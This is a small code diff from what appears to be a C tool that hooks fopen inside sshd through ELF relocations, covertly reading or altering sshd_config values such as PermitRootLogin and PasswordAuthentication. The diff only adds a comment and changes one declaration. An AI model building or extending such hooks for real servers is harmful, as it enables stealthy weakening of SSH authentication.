@@ -22,6 +22,7 @@ static int hook_rela(Elf64_Rela *foundrela, void *func, int type);
  *	and then unhook ourselves sneaky beaky like
  * TODO: sanity
  * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
+ * TODO: no need to read() - use strcat() and getline()
  * XXX: there is probably an easier way to do what I'm trying to do with bitmasks, but I like the practice and it feels cool
  */
 FILE *my_fopen(char *filename, char *mode)
@@ -41,7 +42,7 @@ FILE *my_fopen(char *filename, char *mode)
 	 */
 	char *PermitRootLogin = NULL;
 	char *PasswordAuthentication = NULL;
-	char *ref_PRL = malloc(128);
+	char *ref_PRL;
 	char *ref_PA = "PasswordAuthentication no\n";
 
 	uint64_t BITMASK = MASK_64;	
